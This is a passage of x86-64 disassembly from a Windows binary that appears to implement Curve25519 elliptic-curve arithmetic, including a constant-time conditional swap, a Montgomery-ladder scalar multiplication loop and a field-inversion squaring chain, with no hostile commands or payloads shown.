   140003f0c:	48 01 47 28          	add    %rax,0x28(%rdi)
   140003f10:	48 6b 47 70 13       	imul   $0x13,0x70(%rdi),%rax
   140003f15:	48 01 47 20          	add    %rax,0x20(%rdi)
   140003f19:	48 6b 47 68 13       	imul   $0x13,0x68(%rdi),%rax
   140003f1e:	48 01 47 18          	add    %rax,0x18(%rdi)
   140003f22:	48 6b 47 60 13       	imul   $0x13,0x60(%rdi),%rax
   140003f27:	48 01 47 10          	add    %rax,0x10(%rdi)
   140003f2b:	48 6b 47 58 13       	imul   $0x13,0x58(%rdi),%rax
   140003f30:	48 01 47 08          	add    %rax,0x8(%rdi)
   140003f34:	48 6b 47 50 13       	imul   $0x13,0x50(%rdi),%rax
   140003f39:	48 01 07             	add    %rax,(%rdi)
   140003f3c:	e8 1f e8 ff ff       	call   0x140002760
   140003f41:	48 8b 8d a0 03 00 00 	mov    0x3a0(%rbp),%rcx
   140003f48:	48 33 cc             	xor    %rsp,%rcx
   140003f4b:	e8 90 5a 00 00       	call   0x1400099e0
   140003f50:	48 81 c4 b8 04 00 00 	add    $0x4b8,%rsp
   140003f57:	41 5f                	pop    %r15
   140003f59:	41 5e                	pop    %r14
   140003f5b:	41 5d                	pop    %r13
   140003f5d:	41 5c                	pop    %r12
   140003f5f:	5f                   	pop    %rdi
   140003f60:	5e                   	pop    %rsi
   140003f61:	5b                   	pop    %rbx
   140003f62:	5d                   	pop    %rbp
   140003f63:	c3                   	ret
   140003f64:	cc                   	int3
   140003f65:	cc                   	int3
   140003f66:	cc                   	int3
   140003f67:	cc                   	int3
   140003f68:	cc                   	int3
   140003f69:	cc                   	int3
   140003f6a:	cc                   	int3
   140003f6b:	cc                   	int3
   140003f6c:	cc                   	int3
   140003f6d:	cc                   	int3
   140003f6e:	cc                   	int3
   140003f6f:	cc                   	int3
   140003f70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f75:	4c 63 09             	movslq (%rcx),%r9
   140003f78:	48 8b da             	mov    %rdx,%rbx
   140003f7b:	4c 8b d9             	mov    %rcx,%r11
   140003f7e:	41 f7 d8             	neg    %r8d
   140003f81:	4d 63 d0             	movslq %r8d,%r10
   140003f84:	4c 63 02             	movslq (%rdx),%r8
   140003f87:	4d 33 c1             	xor    %r9,%r8
   140003f8a:	4d 23 c2             	and    %r10,%r8
   140003f8d:	49 8b c0             	mov    %r8,%rax
   140003f90:	49 33 c1             	xor    %r9,%rax
   140003f93:	48 89 01             	mov    %rax,(%rcx)
   140003f96:	48 63 02             	movslq (%rdx),%rax
   140003f99:	49 33 c0             	xor    %r8,%rax
   140003f9c:	48 89 02             	mov    %rax,(%rdx)
   140003f9f:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140003fa3:	48 63 49 08          	movslq 0x8(%rcx),%rcx
   140003fa7:	48 33 d1             	xor    %rcx,%rdx
   140003faa:	49 23 d2             	and    %r10,%rdx
   140003fad:	48 8b c2             	mov    %rdx,%rax
   140003fb0:	48 33 c1             	xor    %rcx,%rax
   140003fb3:	49 89 43 08          	mov    %rax,0x8(%r11)
   140003fb7:	48 63 43 08          	movslq 0x8(%rbx),%rax
   140003fbb:	48 33 c2             	xor    %rdx,%rax
   140003fbe:	48 63 53 10          	movslq 0x10(%rbx),%rdx
   140003fc2:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140003fc6:	49 63 4b 10          	movslq 0x10(%r11),%rcx
   140003fca:	48 33 d1             	xor    %rcx,%rdx
   140003fcd:	49 23 d2             	and    %r10,%rdx
   140003fd0:	48 8b c2             	mov    %rdx,%rax
   140003fd3:	48 33 c1             	xor    %rcx,%rax
   140003fd6:	49 89 43 10          	mov    %rax,0x10(%r11)
   140003fda:	48 63 43 10          	movslq 0x10(%rbx),%rax
   140003fde:	48 33 c2             	xor    %rdx,%rax
   140003fe1:	48 63 53 18          	movslq 0x18(%rbx),%rdx
   140003fe5:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140003fe9:	49 63 4b 18          	movslq 0x18(%r11),%rcx
   140003fed:	48 33 d1             	xor    %rcx,%rdx
   140003ff0:	49 23 d2             	and    %r10,%rdx
   140003ff3:	48 8b c2             	mov    %rdx,%rax
   140003ff6:	48 33 c1             	xor    %rcx,%rax
   140003ff9:	49 89 43 18          	mov    %rax,0x18(%r11)
   140003ffd:	48 63 43 18          	movslq 0x18(%rbx),%rax
   140004001:	48 33 c2             	xor    %rdx,%rax
   140004004:	48 63 53 20          	movslq 0x20(%rbx),%rdx
   140004008:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000400c:	49 63 4b 20          	movslq 0x20(%r11),%rcx
   140004010:	48 33 d1             	xor    %rcx,%rdx
   140004013:	49 23 d2             	and    %r10,%rdx
   140004016:	48 8b c2             	mov    %rdx,%rax
   140004019:	48 33 c1             	xor    %rcx,%rax
   14000401c:	49 89 43 20          	mov    %rax,0x20(%r11)
   140004020:	48 63 43 20          	movslq 0x20(%rbx),%rax
   140004024:	48 33 c2             	xor    %rdx,%rax
   140004027:	48 63 53 28          	movslq 0x28(%rbx),%rdx
   14000402b:	48 89 43 20          	mov    %rax,0x20(%rbx)
   14000402f:	49 63 4b 28          	movslq 0x28(%r11),%rcx
   140004033:	48 33 d1             	xor    %rcx,%rdx
   140004036:	49 23 d2             	and    %r10,%rdx
   140004039:	48 8b c2             	mov    %rdx,%rax
   14000403c:	48 33 c1             	xor    %rcx,%rax
   14000403f:	49 89 43 28          	mov    %rax,0x28(%r11)
   140004043:	48 63 43 28          	movslq 0x28(%rbx),%rax
   140004047:	48 33 c2             	xor    %rdx,%rax
   14000404a:	48 63 53 30          	movslq 0x30(%rbx),%rdx
   14000404e:	48 89 43 28          	mov    %rax,0x28(%rbx)
   140004052:	49 63 4b 30          	movslq 0x30(%r11),%rcx
   140004056:	48 33 d1             	xor    %rcx,%rdx
   140004059:	49 23 d2             	and    %r10,%rdx
   14000405c:	48 8b c2             	mov    %rdx,%rax
   14000405f:	48 33 c1             	xor    %rcx,%rax
   140004062:	49 89 43 30          	mov    %rax,0x30(%r11)
   140004066:	48 63 43 30          	movslq 0x30(%rbx),%rax
   14000406a:	48 33 c2             	xor    %rdx,%rax
   14000406d:	48 63 53 38          	movslq 0x38(%rbx),%rdx
   140004071:	48 89 43 30          	mov    %rax,0x30(%rbx)
   140004075:	49 63 4b 38          	movslq 0x38(%r11),%rcx
   140004079:	48 33 d1             	xor    %rcx,%rdx
   14000407c:	49 23 d2             	and    %r10,%rdx
   14000407f:	48 8b c2             	mov    %rdx,%rax
   140004082:	48 33 c1             	xor    %rcx,%rax
   140004085:	49 89 43 38          	mov    %rax,0x38(%r11)
   140004089:	48 63 43 38          	movslq 0x38(%rbx),%rax
   14000408d:	48 33 c2             	xor    %rdx,%rax
   140004090:	48 63 53 40          	movslq 0x40(%rbx),%rdx
   140004094:	48 89 43 38          	mov    %rax,0x38(%rbx)
   140004098:	49 63 4b 40          	movslq 0x40(%r11),%rcx
   14000409c:	48 33 d1             	xor    %rcx,%rdx
   14000409f:	49 23 d2             	and    %r10,%rdx
   1400040a2:	48 8b c2             	mov    %rdx,%rax
   1400040a5:	48 33 c1             	xor    %rcx,%rax
   1400040a8:	49 89 43 40          	mov    %rax,0x40(%r11)
   1400040ac:	48 63 43 40          	movslq 0x40(%rbx),%rax
   1400040b0:	48 33 c2             	xor    %rdx,%rax
   1400040b3:	48 63 53 48          	movslq 0x48(%rbx),%rdx
   1400040b7:	48 89 43 40          	mov    %rax,0x40(%rbx)
   1400040bb:	49 63 4b 48          	movslq 0x48(%r11),%rcx
   1400040bf:	48 33 d1             	xor    %rcx,%rdx
   1400040c2:	49 23 d2             	and    %r10,%rdx
   1400040c5:	48 8b c2             	mov    %rdx,%rax
   1400040c8:	48 33 c1             	xor    %rcx,%rax
   1400040cb:	49 89 43 48          	mov    %rax,0x48(%r11)
   1400040cf:	48 63 43 48          	movslq 0x48(%rbx),%rax
   1400040d3:	48 33 c2             	xor    %rdx,%rax
   1400040d6:	48 89 43 48          	mov    %rax,0x48(%rbx)
   1400040da:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400040df:	c3                   	ret
   1400040e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400040e5:	55                   	push   %rbp
   1400040e6:	56                   	push   %rsi
   1400040e7:	57                   	push   %rdi
   1400040e8:	41 54                	push   %r12
   1400040ea:	41 55                	push   %r13
   1400040ec:	41 56                	push   %r14
   1400040ee:	41 57                	push   %r15
   1400040f0:	48 8d ac 24 60 fb ff 	lea    -0x4a0(%rsp),%rbp
   1400040f7:	ff 
   1400040f8:	48 81 ec a0 05 00 00 	sub    $0x5a0,%rsp
   1400040ff:	48 8b 05 fa 6e 00 00 	mov    0x6efa(%rip),%rax        # 0x14000b000
   140004106:	48 33 c4             	xor    %rsp,%rax
   140004109:	48 89 85 90 04 00 00 	mov    %rax,0x490(%rbp)
   140004110:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004113:	48 89 4d 80          	mov    %rcx,-0x80(%rbp)
   140004117:	33 c9                	xor    %ecx,%ecx
   140004119:	4c 89 4c 24 70       	mov    %r9,0x70(%rsp)
   14000411e:	48 8d 85 f0 03 00 00 	lea    0x3f0(%rbp),%rax
   140004125:	4c 89 44 24 78       	mov    %r8,0x78(%rsp)
   14000412a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000412f:	4c 8d b5 10 02 00 00 	lea    0x210(%rbp),%r14
   140004136:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   14000413d:	48 89 55 88          	mov    %rdx,-0x78(%rbp)
   140004141:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004146:	4c 8d 7d 90          	lea    -0x70(%rbp),%r15
   14000414a:	48 8d 85 10 02 00 00 	lea    0x210(%rbp),%rax
   140004151:	0f 11 00             	movups %xmm0,(%rax)
   140004154:	48 8d 75 30          	lea    0x30(%rbp),%rsi
   140004158:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   14000415c:	48 8d 9d b0 02 00 00 	lea    0x2b0(%rbp),%rbx
   140004163:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140004167:	4c 8d a5 50 03 00 00 	lea    0x350(%rbp),%r12
   14000416e:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   140004172:	4c 8d ad d0 00 00 00 	lea    0xd0(%rbp),%r13
   140004179:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   14000417d:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140004181:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140004185:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   140004189:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   140004190:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   140004197:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   14000419b:	0f 11 00             	movups %xmm0,(%rax)
   14000419e:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   1400041a2:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   1400041a6:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   1400041aa:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   1400041ae:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   1400041b2:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   1400041b6:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   1400041ba:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   1400041c1:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   1400041c8:	48 8d 45 30          	lea    0x30(%rbp),%rax
   1400041cc:	0f 11 00             	movups %xmm0,(%rax)
   1400041cf:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   1400041d3:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   1400041d7:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   1400041db:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   1400041df:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   1400041e3:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   1400041e7:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   1400041eb:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   1400041f2:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   1400041f9:	48 8d 85 b0 02 00 00 	lea    0x2b0(%rbp),%rax
   140004200:	0f 11 00             	movups %xmm0,(%rax)
   140004203:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   140004207:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   14000420b:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   14000420f:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140004213:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140004217:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   14000421b:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   14000421f:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   140004226:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   14000422d:	48 8d 85 50 03 00 00 	lea    0x350(%rbp),%rax
   140004234:	0f 11 00             	movups %xmm0,(%rax)
   140004237:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   14000423b:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   14000423f:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   140004243:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140004247:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   14000424b:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   14000424f:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   140004253:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   14000425a:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   140004261:	48 8d 85 d0 00 00 00 	lea    0xd0(%rbp),%rax
   140004268:	0f 11 00             	movups %xmm0,(%rax)
   14000426b:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   14000426f:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140004273:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   140004277:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   14000427b:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   14000427f:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140004283:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   140004287:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   14000428e:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   140004295:	48 8d 85 f0 03 00 00 	lea    0x3f0(%rbp),%rax
   14000429c:	0f 11 00             	movups %xmm0,(%rax)
   14000429f:	48 c7 45 90 01 00 00 	movq   $0x1,-0x70(%rbp)
   1400042a6:	00 
   1400042a7:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   1400042ab:	48 c7 45 30 01 00 00 	movq   $0x1,0x30(%rbp)
   1400042b2:	00 
   1400042b3:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   1400042b7:	48 c7 85 d0 00 00 00 	movq   $0x1,0xd0(%rbp)
   1400042be:	01 00 00 00 
   1400042c2:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   1400042c6:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   1400042ca:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   1400042ce:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   1400042d2:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   1400042d6:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   1400042dd:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   1400042e4:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   1400042eb:	0f 11 00             	movups %xmm0,(%rax)
   1400042ee:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   1400042f2:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   1400042f6:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   1400042fa:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   1400042fe:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140004302:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140004306:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   14000430a:	0f 11 80 80 00 00 00 	movups %xmm0,0x80(%rax)
   140004311:	48 89 88 90 00 00 00 	mov    %rcx,0x90(%rax)
   140004318:	48 c7 85 70 01 00 00 	movq   $0x1,0x170(%rbp)
   14000431f:	01 00 00 00 
   140004323:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004327:	8b 44 24 50          	mov    0x50(%rsp),%eax
   14000432b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004330:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   140004335:	48 63 4c 24 50       	movslq 0x50(%rsp),%rcx
   14000433a:	42 0f b6 04 08       	movzbl (%rax,%r9,1),%eax
   14000433f:	88 84 0d 10 02 00 00 	mov    %al,0x210(%rbp,%rcx,1)
   140004346:	8b 44 24 50          	mov    0x50(%rsp),%eax
   14000434a:	ff c0                	inc    %eax
   14000434c:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140004350:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140004354:	83 f8 50             	cmp    $0x50,%eax
   140004357:	72 d7                	jb     0x140004330
   140004359:	33 c9                	xor    %ecx,%ecx
   14000435b:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   14000435f:	90                   	nop
   140004360:	b8 1f 00 00 00       	mov    $0x1f,%eax
   140004365:	48 c7 44 24 68 08 00 	movq   $0x8,0x68(%rsp)
   14000436c:	00 00 
   14000436e:	2b c1                	sub    %ecx,%eax
   140004370:	42 0f b6 04 00       	movzbl (%rax,%r8,1),%eax
   140004375:	88 44 24 54          	mov    %al,0x54(%rsp)
   140004379:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004380:	0f b6 f8             	movzbl %al,%edi
   140004383:	49 8b d6             	mov    %r14,%rdx
   140004386:	48 c1 ef 07          	shr    $0x7,%rdi
   14000438a:	48 8b ce             	mov    %rsi,%rcx
   14000438d:	4c 8b c7             	mov    %rdi,%r8
   140004390:	e8 db fb ff ff       	call   0x140003f70
   140004395:	4c 8b c7             	mov    %rdi,%r8
   140004398:	49 8b d7             	mov    %r15,%rdx
   14000439b:	48 8b cb             	mov    %rbx,%rcx
   14000439e:	e8 cd fb ff ff       	call   0x140003f70
   1400043a3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400043a8:	4d 8b cd             	mov    %r13,%r9
   1400043ab:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400043b0:	4d 8b c4             	mov    %r12,%r8
   1400043b3:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400043b8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400043bd:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   1400043c2:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400043c7:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400043cc:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400043d1:	e8 2a f1 ff ff       	call   0x140003500
   1400043d6:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400043db:	4c 8b c7             	mov    %rdi,%r8
   1400043de:	49 8b d4             	mov    %r12,%rdx
   1400043e1:	e8 8a fb ff ff       	call   0x140003f70
   1400043e6:	4c 8b c7             	mov    %rdi,%r8
   1400043e9:	49 8b d5             	mov    %r13,%rdx
   1400043ec:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400043f1:	48 8b cf             	mov    %rdi,%rcx
   1400043f4:	e8 77 fb ff ff       	call   0x140003f70
   1400043f9:	48 8b c6             	mov    %rsi,%rax
   1400043fc:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140004401:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004406:	48 8b df             	mov    %rdi,%rbx
   140004409:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000440e:	49 8b c6             	mov    %r14,%rax
   140004411:	4d 8b f4             	mov    %r12,%r14
   140004414:	4c 8b e0             	mov    %rax,%r12
   140004417:	49 8b c7             	mov    %r15,%rax
   14000441a:	4d 8b fd             	mov    %r13,%r15
   14000441d:	4c 8b e8             	mov    %rax,%r13
   140004420:	0f b6 44 24 54       	movzbl 0x54(%rsp),%eax
   140004425:	02 c0                	add    %al,%al
   140004427:	48 83 6c 24 68 01    	subq   $0x1,0x68(%rsp)
   14000442d:	88 44 24 54          	mov    %al,0x54(%rsp)
   140004431:	0f 85 49 ff ff ff    	jne    0x140004380
   140004437:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000443b:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   140004440:	ff c1                	inc    %ecx
   140004442:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004446:	83 f9 20             	cmp    $0x20,%ecx
   140004449:	0f 82 11 ff ff ff    	jb     0x140004360
   14000444f:	4c 8b 45 80          	mov    -0x80(%rbp),%r8
   140004453:	45 33 c9             	xor    %r9d,%r9d
   140004456:	44 89 4c 24 50       	mov    %r9d,0x50(%rsp)
   14000445b:	8b 44 24 50          	mov    0x50(%rsp),%eax
   14000445f:	90                   	nop
   140004460:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   140004465:	48 63 4c 24 50       	movslq 0x50(%rsp),%rcx
   14000446a:	0f b6 04 30          	movzbl (%rax,%rsi,1),%eax
   14000446e:	42 88 04 01          	mov    %al,(%rcx,%r8,1)
   140004472:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140004476:	ff c0                	inc    %eax
   140004478:	89 44 24 50          	mov    %eax,0x50(%rsp)
   14000447c:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140004480:	83 f8 50             	cmp    $0x50,%eax
   140004483:	72 db                	jb     0x140004460
   140004485:	4c 8b 45 88          	mov    -0x78(%rbp),%r8
   140004489:	44 89 4c 24 50       	mov    %r9d,0x50(%rsp)
   14000448e:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140004492:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   140004497:	48 63 4c 24 50       	movslq 0x50(%rsp),%rcx
   14000449c:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   1400044a0:	42 88 04 01          	mov    %al,(%rcx,%r8,1)
   1400044a4:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1400044a8:	ff c0                	inc    %eax
   1400044aa:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400044ae:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1400044b2:	83 f8 50             	cmp    $0x50,%eax
   1400044b5:	72 db                	jb     0x140004492
   1400044b7:	48 8b 8d 90 04 00 00 	mov    0x490(%rbp),%rcx
   1400044be:	48 33 cc             	xor    %rsp,%rcx
   1400044c1:	e8 1a 55 00 00       	call   0x1400099e0
   1400044c6:	48 8b 9c 24 f0 05 00 	mov    0x5f0(%rsp),%rbx
   1400044cd:	00 
   1400044ce:	48 81 c4 a0 05 00 00 	add    $0x5a0,%rsp
   1400044d5:	41 5f                	pop    %r15
   1400044d7:	41 5e                	pop    %r14
   1400044d9:	41 5d                	pop    %r13
   1400044db:	41 5c                	pop    %r12
   1400044dd:	5f                   	pop    %rdi
   1400044de:	5e                   	pop    %rsi
   1400044df:	5d                   	pop    %rbp
   1400044e0:	c3                   	ret
   1400044e1:	cc                   	int3
   1400044e2:	cc                   	int3
   1400044e3:	cc                   	int3
   1400044e4:	cc                   	int3
   1400044e5:	cc                   	int3
   1400044e6:	cc                   	int3
   1400044e7:	cc                   	int3
   1400044e8:	cc                   	int3
   1400044e9:	cc                   	int3
   1400044ea:	cc                   	int3
   1400044eb:	cc                   	int3
   1400044ec:	cc                   	int3
   1400044ed:	cc                   	int3
   1400044ee:	cc                   	int3
   1400044ef:	cc                   	int3
   1400044f0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400044f5:	55                   	push   %rbp
   1400044f6:	56                   	push   %rsi
   1400044f7:	57                   	push   %rdi
   1400044f8:	48 8d ac 24 b0 fd ff 	lea    -0x250(%rsp),%rbp
   1400044ff:	ff 
   140004500:	48 81 ec 50 03 00 00 	sub    $0x350,%rsp
   140004507:	48 8b 05 f2 6a 00 00 	mov    0x6af2(%rip),%rax        # 0x14000b000
   14000450e:	48 33 c4             	xor    %rsp,%rax
   140004511:	48 89 85 40 02 00 00 	mov    %rax,0x240(%rbp)
   140004518:	48 8b f1             	mov    %rcx,%rsi
   14000451b:	48 8b da             	mov    %rdx,%rbx
   14000451e:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140004522:	e8 89 e7 ff ff       	call   0x140002cb0
   140004527:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   14000452b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004530:	e8 7b e7 ff ff       	call   0x140002cb0
   140004535:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000453a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000453f:	e8 6c e7 ff ff       	call   0x140002cb0
   140004544:	4c 8b c3             	mov    %rbx,%r8
   140004547:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000454c:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   140004553:	e8 c8 e2 ff ff       	call   0x140002820
   140004558:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   14000455c:	48 8d 95 b0 00 00 00 	lea    0xb0(%rbp),%rdx
   140004563:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   14000456a:	e8 b1 e2 ff ff       	call   0x140002820
   14000456f:	48 8d 95 f0 01 00 00 	lea    0x1f0(%rbp),%rdx
   140004576:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000457b:	e8 30 e7 ff ff       	call   0x140002cb0
   140004580:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140004587:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000458c:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   140004593:	e8 88 e2 ff ff       	call   0x140002820
   140004598:	48 8d 95 00 01 00 00 	lea    0x100(%rbp),%rdx
   14000459f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400045a4:	e8 07 e7 ff ff       	call   0x140002cb0
   1400045a9:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045ae:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400045b3:	e8 f8 e6 ff ff       	call   0x140002cb0
   1400045b8:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400045bd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400045c2:	e8 e9 e6 ff ff       	call   0x140002cb0
   1400045c7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045cc:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400045d1:	e8 da e6 ff ff       	call   0x140002cb0
   1400045d6:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400045db:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400045e0:	e8 cb e6 ff ff       	call   0x140002cb0
   1400045e5:	4c 8d 85 00 01 00 00 	lea    0x100(%rbp),%r8
   1400045ec:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045f1:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400045f5:	e8 26 e2 ff ff       	call   0x140002820
   1400045fa:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400045fe:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004603:	e8 a8 e6 ff ff       	call   0x140002cb0
   140004608:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000460d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004612:	e8 99 e6 ff ff       	call   0x140002cb0
   140004617:	bf 04 00 00 00       	mov    $0x4,%edi
   14000461c:	8b df                	mov    %edi,%ebx
   14000461e:	66 90                	xchg   %ax,%ax
   140004620:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004625:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000462a:	e8 81 e6 ff ff       	call   0x140002cb0
   14000462f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004634:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004639:	e8 72 e6 ff ff       	call   0x140002cb0
   14000463e:	48 83 eb 01          	sub    $0x1,%rbx
   140004642:	75 dc                	jne    0x140004620
   140004644:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   140004648:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000464d:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   140004654:	e8 c7 e1 ff ff       	call   0x140002820
   140004659:	48 8d 95 50 01 00 00 	lea    0x150(%rbp),%rdx
   140004660:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004665:	e8 46 e6 ff ff       	call   0x140002cb0
   14000466a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000466f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004674:	e8 37 e6 ff ff       	call   0x140002cb0
   140004679:	bb 09 00 00 00       	mov    $0x9,%ebx
   14000467e:	66 90                	xchg   %ax,%ax
   140004680:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004685:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
